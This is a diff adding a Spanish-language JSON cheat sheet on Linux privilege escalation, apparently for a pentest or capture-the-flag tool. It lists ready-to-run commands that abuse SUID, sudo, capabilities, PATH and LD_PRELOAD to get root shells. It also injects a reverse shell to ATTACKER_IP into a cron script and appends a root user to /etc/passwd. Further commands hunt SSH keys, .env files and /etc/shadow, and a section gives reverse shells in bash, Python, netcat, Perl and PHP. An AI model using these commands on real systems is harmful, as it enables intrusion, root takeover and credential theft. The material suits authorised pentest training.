@@ -1,0 +1,227 @@
+{
+  "name": "Linux Privilege Escalation",
+  "description": "Técnicas de escalada de privilegios en Linux",
+  "version": "1.0",
+  "categories": {
+    "enumeration": {
+      "title": "Enumeración Inicial",
+      "severity": "info",
+      "commands": [
+        {"cmd": "id && whoami && hostname", "desc": "Usuario actual, grupos y nombre de máquina"},
+        {"cmd": "cat /etc/passwd | grep -v nologin", "desc": "Usuarios con shell activo"},
+        {"cmd": "cat /etc/os-release && uname -a", "desc": "Versión del SO y kernel"},
+        {"cmd": "ps aux --forest", "desc": "Procesos en ejecución con jerarquía"},
+        {"cmd": "env && cat /proc/self/environ", "desc": "Variables de entorno (tokens, rutas, claves)"},
+        {"cmd": "ip a && netstat -tulpn 2>/dev/null", "desc": "Interfaces y puertos en escucha"},
+        {"cmd": "ss -tulpn", "desc": "Alternativa moderna a netstat"},
+        {"cmd": "cat /etc/crontab; ls -la /etc/cron*", "desc": "Cron global y directorios periódicos"},
+        {"cmd": "find / -writable -type f 2>/dev/null | grep -v proc", "desc": "Archivos escribibles en todo el sistema"},
+        {"cmd": "history; cat ~/.bash_history", "desc": "Historial de comandos — contraseñas en claro frecuentes"},
+        {"cmd": "cat /etc/hosts && route -n", "desc": "Hosts conocidos y tabla de rutas"},
+        {"cmd": "ls -la /home/*/", "desc": "Directorios home y sus permisos"}
+      ]
+    },
+    "auto_enum": {
+      "title": "Enumeración Automática",
+      "severity": "info",
+      "commands": [
+        {"cmd": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh", "desc": "LinPEAS — descarga directa"},
+        {"cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", "desc": "LinPEAS directo sin guardar"},
+        {"cmd": "wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh && bash linux-exploit-suggester.sh", "desc": "Linux Exploit Suggester — vulnerabilidades de kernel"},
+        {"cmd": "wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh && bash lse.sh -l 1", "desc": "LSE — alternativa a LinPEAS"},
+        {"cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", "desc": "Upgrade de shell básico a TTY interactiva"}
+      ]
+    },
+    "suid": {
+      "title": "SUID / SGID",
+      "severity": "critical",
+      "commands": [
+        {"cmd": "find / -perm -4000 -type f 2>/dev/null", "desc": "Todos los binarios SUID del sistema"},
+        {"cmd": "find / -perm -2000 -type f 2>/dev/null", "desc": "Binarios SGID"},
+        {"cmd": "find / -perm -4000 -o -perm -2000 -type f 2>/dev/null", "desc": "SUID y SGID en un solo comando"},
+        {"cmd": "/usr/bin/find . -exec /bin/sh -p \\; -quit", "desc": "Explotar SUID en find → shell root"},
+        {"cmd": "/usr/bin/vim -c ':!/bin/sh'", "desc": "Explotar SUID en vim → shell root"},
+        {"cmd": "/usr/bin/python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'", "desc": "SUID en Python → shell root"},
+        {"cmd": "/usr/bin/bash -p", "desc": "Si bash tiene SUID, -p preserva euid"},
+        {"cmd": "https://gtfobins.github.io/", "desc": "GTFOBins — referencia completa de exploits por binario"}
+      ]
+    },
+    "sudo": {
+      "title": "SUDO Mal Configurado",
+      "severity": "critical",
+      "commands": [
+        {"cmd": "sudo -l", "desc": "Ver qué puedes ejecutar como sudo"},
+        {"cmd": "sudo -l -U usuario", "desc": "Ver permisos sudo de otro usuario"},
+        {"cmd": "sudo /bin/bash", "desc": "Si tienes ALL → shell root directa"},
+        {"cmd": "sudo find /etc -exec /bin/sh \\;", "desc": "sudo + find para escalar"},
+        {"cmd": "sudo vim -c ':!/bin/bash'", "desc": "sudo + vim → shell root"},
+        {"cmd": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'", "desc": "sudo + Python"},
+        {"cmd": "sudo awk 'BEGIN {system(\"/bin/bash\")}'", "desc": "sudo + awk"},
+        {"cmd": "sudo less /etc/passwd → !/bin/sh", "desc": "sudo + less → escribir !/bin/sh dentro"},
+        {"cmd": "cat /etc/sudoers 2>/dev/null", "desc": "Leer sudoers si tienes acceso (NOPASSWD líneas)"}
+      ]
+    },
+    "cron": {
+      "title": "CRON Jobs",
+      "severity": "high",
+      "commands": [
+        {"cmd": "cat /etc/crontab", "desc": "Crontab global del sistema"},
+        {"cmd": "ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/", "desc": "Todos los directorios de cron"},
+        {"cmd": "crontab -l", "desc": "Crontab del usuario actual"},
+        {"cmd": "cat /var/spool/cron/crontabs/*", "desc": "Crontabs de todos los usuarios"},
+        {"cmd": "echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /ruta/script_cron.sh", "desc": "Inyectar reverse shell en script de cron escribible"},
+        {"cmd": "find / -name \"pspy*\" 2>/dev/null", "desc": "pspy — monitoriza procesos en tiempo real sin root"},
+        {"cmd": "watch -n 1 \"ps aux | grep root\"", "desc": "Detectar procesos root que se ejecutan periódicamente"}
+      ]
+    },
+    "capabilities": {
+      "title": "CAPABILITIES",
+      "severity": "high",
+      "commands": [
+        {"cmd": "getcap -r / 2>/dev/null", "desc": "Listar todos los binarios con capabilities"},
+        {"cmd": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", "desc": "Python con cap_setuid → root"},
+        {"cmd": "perl -e 'use POSIX; setuid(0); exec \"/bin/bash\";'", "desc": "Perl con cap_setuid → root"},
+        {"cmd": "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'", "desc": "Ruby con cap_setuid"},
+        {"cmd": "cap_net_raw+ep", "desc": "Permite sniffing de red (tcpdump sin sudo)"},
+        {"cmd": "cap_dac_read_search+ep", "desc": "Leer cualquier archivo del sistema sin permisos"}
+      ]
+    },
+    "writable_files": {
+      "title": "ARCHIVOS ESCRIBIBLES",
+      "severity": "high",
+      "commands": [
+        {"cmd": "find / -writable -type f 2>/dev/null | grep -Ev \"proc|sys|dev\"", "desc": "Archivos escribibles fuera de pseudo-fs"},
+        {"cmd": "ls -la /etc/passwd /etc/shadow /etc/sudoers", "desc": "Verificar si archivos críticos son escribibles"},
+        {"cmd": "echo 'root2:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' >> /etc/passwd", "desc": "Añadir usuario root si /etc/passwd es escribible"},
+        {"cmd": "find /etc -writable -type f 2>/dev/null", "desc": "Configuraciones de sistema escribibles"},
+        {"cmd": "find /var /tmp /dev/shm -writable -type d 2>/dev/null", "desc": "Directorios escribibles para depositar payloads"},
+        {"cmd": "find / -name \"*.conf\" -writable 2>/dev/null", "desc": "Archivos de configuración escribibles"},
+        {"cmd": "ls -la /etc/ld.so.conf.d/", "desc": "Rutas de librería dinámicas — LD preload attack"},
+        {"cmd": "find / -name \"*.sh\" -writable 2>/dev/null", "desc": "Scripts shell escribibles (posibles cron targets)"}
+      ]
+    },
+    "path_hijacking": {
+      "title": "PATH HIJACKING",
+      "severity": "high",
+      "commands": [
+        {"cmd": "echo $PATH", "desc": "Ver el PATH actual"},
+        {"cmd": "export PATH=/tmp:$PATH", "desc": "Añadir /tmp al inicio del PATH"},
+        {"cmd": "echo '/bin/bash -p' > /tmp/NOMBRE_BINARIO && chmod +x /tmp/NOMBRE_BINARIO", "desc": "Crear binario falso en /tmp que lanza bash root"},
+        {"cmd": "strings /usr/local/bin/script_suid | grep -v \"^/\"", "desc": "Detectar llamadas sin ruta absoluta en un binario SUID"},
+        {"cmd": "ltrace ./script_suid 2>&1 | head -40", "desc": "Trazar llamadas a librería para ver qué ejecuta"}
+      ]
+    },
+    "kernel": {
+      "title": "KERNEL EXPLOITS",
+      "severity": "critical",
+      "commands": [
+        {"cmd": "uname -r", "desc": "Versión exacta del kernel — buscar en Exploit-DB"},
+        {"cmd": "cat /proc/version", "desc": "Versión y compilador del kernel"},
+        {"cmd": "DirtyPipe — CVE-2022-0847", "desc": "Kernel 5.8-5.16: write a archivos de solo lectura → root"},
+        {"cmd": "DirtyC0w — CVE-2016-5195", "desc": "Race condition clásico, kernels < 4.8.3"},
+        {"cmd": "Overlayfs — CVE-2021-3493", "desc": "Ubuntu 20.04 LTS → root inmediato"},
+        {"cmd": "PwnKit — CVE-2021-4034", "desc": "pkexec SUID en casi todas las distros → root"},
+        {"cmd": "searchsploit \"linux kernel $(uname -r | cut -d. -f1,2)\"", "desc": "Buscar exploits locales con searchsploit"}
+      ]
+    },
+    "credentials": {
+      "title": "CAZA DE CREDENCIALES",
+      "severity": "high",
+      "commands": [
+        {"cmd": "grep -rn \"password\\|passwd\\|secret\\|api_key\" /var/www/ 2>/dev/null", "desc": "Buscar credenciales en webs"},
+        {"cmd": "find / -name \"*.conf\" -o -name \"*.config\" -o -name \"*.cfg\" 2>/dev/null | xargs grep -l \"pass\" 2>/dev/null", "desc": "Configs con posibles contraseñas"},
+        {"cmd": "cat ~/.ssh/id_rsa 2>/dev/null", "desc": "Clave SSH privada del usuario"},
+        {"cmd": "find / -name \"id_rsa\" -o -name \"id_ecdsa\" -o -name \"*.pem\" 2>/dev/null", "desc": "Claves SSH en todo el sistema"},
+        {"cmd": "cat /etc/shadow 2>/dev/null", "desc": "Hashes de contraseñas (requiere root o permisos)"},
+        {"cmd": "find / -name \".env\" 2>/dev/null | xargs cat 2>/dev/null", "desc": "Archivos .env con tokens y secrets"},
+        {"cmd": "find / -name \"wp-config.php\" -o -name \"config.php\" 2>/dev/null", "desc": "Configs de WordPress y otros CMS"},
+        {"cmd": "mysql -u root --password 2>/dev/null", "desc": "MySQL sin contraseña — muy común en labs"}
+      ]
+    },
+    "ld_preload": {
+      "title": "LD_PRELOAD / LD_LIBRARY",
+      "severity": "critical",
+      "commands": [
+        {"cmd": "sudo -l | grep LD_PRELOAD", "desc": "Verificar si LD_PRELOAD está en env_keep"},
+        {"cmd": "gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c", "desc": "Compilar la librería maliciosa"},
+        {"cmd": "sudo LD_PRELOAD=/tmp/shell.so /usr/bin/cualquier-binario", "desc": "Ejecutar con LD_PRELOAD → bash root"}
+      ]
+    }
+  },
+  "shells": {
+    "bash_tcp": {
+      "syntax": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
+      "desc": "La más clásica. Funciona en casi cualquier bash moderno.",
+      "type": "bash",
+      "protocol": "tcp"
+    },
+    "bash_udp": {
+      "syntax": "bash -i >& /dev/udp/ATTACKER_IP/4444 0>&1",
+      "desc": "Útil si TCP está bloqueado por firewall.",
+      "type": "bash",
+      "protocol": "udp"
+    },
+    "python3": {
+      "syntax": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\"])'",
+      "desc": "Cuando bash no da reverse shell pero Python está disponible.",
+      "type": "python",
+      "protocol": "tcp"
+    },
+    "netcat_e": {
+      "syntax": "nc -e /bin/bash ATTACKER_IP 4444",
+      "desc": "Solo funciona con la versión tradicional de nc (no OpenBSD).",
+      "type": "netcat",
+      "protocol": "tcp"
+    },
+    "netcat_noe": {
+      "syntax": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f",
+      "desc": "Para OpenBSD nc (la más común en sistemas modernos).",
+      "type": "netcat",
+      "protocol": "tcp"
+    },
+    "perl": {
+      "syntax": "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\"$S\");open(STDOUT,\"$S\");open(STDERR,\"$S\");exec(\"/bin/bash -i\");'",
+      "desc": "Útil en servidores con Perl pero sin Python.",
+      "type": "perl",
+      "protocol": "tcp"
+    },
+    "php": {
+      "syntax": "php -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
+      "desc": "Para servidores web con PHP accesible desde CLI.",
+      "type": "php",
+      "protocol": "tcp"
+    }
+  },
+  "methodology": {
+    "steps": [
+      {"step": 1, "name": "Enum", "desc": "Enumerar el sistema"},
+      {"step": 2, "name": "Vector", "desc": "Identificar vector de ataque"},
+      {"step": 3, "name": "Exploit", "desc": "Ejecutar exploit"},
+      {"step": 4, "name": "Root", "desc": "Obtener acceso root"}
+    ],
+    "checklist": [
+      {"id": "INIT", "name": "Obtener shell estable con TTY completa", "cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"},
+      {"id": "ENUM", "name": "Ejecutar `id && uname -a && cat /etc/os-release`", "cmd": "id && uname -a && cat /etc/os-release"},
+      {"id": "AUTO", "name": "Lanzar LinPEAS o LSE y revisar salida", "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"},
+      {"id": "SUDO", "name": "Revisar `sudo -l` — buscar NOPASSWD o ALL", "cmd": "sudo -l"},
+      {"id": "SUID", "name": "Buscar binarios SUID/SGID y cruzar con GTFOBins", "cmd": "find / -perm -4000 -type f 2>/dev/null"},
+      {"id": "CRON", "name": "Revisar crontabs: global, usuario y directorios cron.*", "cmd": "cat /etc/crontab; ls -la /etc/cron*"},
+      {"id": "CAPS", "name": "Ejecutar `getcap -r / 2>/dev/null`", "cmd": "getcap -r / 2>/dev/null"},
+      {"id": "WRITE", "name": "Buscar archivos escribibles en /etc, /var, /opt", "cmd": "find / -writable -type f 2>/dev/null | grep -Ev proc|sys|dev"},
+      {"id": "CREDS", "name": "Cazar credenciales: historial, configs, .env, SSH keys", "cmd": "find / -name \"*.env\" -o -name \"id_rsa\" -o -name \"*.pem\" 2>/dev/null"},
+      {"id": "KERN", "name": "Ejecutar linux-exploit-suggester para kernel CVEs", "cmd": "wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"},
+      {"id": "NET", "name": "Revisar servicios internos con `ss -tulpn`", "cmd": "ss -tulpn"},
+      {"id": "ROOT", "name": "Confirmar acceso root: `id && cat /root/root.txt`", "cmd": "id && cat /root/root.txt"}
+    ]
+  },
+  "resources": {
+    "critical_vectors": ["SUID en bash/vim/find", "sudo ALL NOPASSWD", "DirtyPipe / PwnKit", "/etc/passwd escribible", "LD_PRELOAD + sudo"],
+    "high_vectors": ["Cron script escribible", "cap_setuid en Python", "PATH hijacking", "Credenciales reutilizadas", "Script root con input"],
+    "links": {
+      "GTFOBins": "https://gtfobins.github.io/",
+      "PayloadsAllTheThings": "https://github.com/swisskyrepo/PayloadsAllTheThings",
+      "HackTricks": "https://book.hacktricks.xyz/",
+      "ExploitDB": "https://www.exploit-db.com/"
+    }
+  }
+}
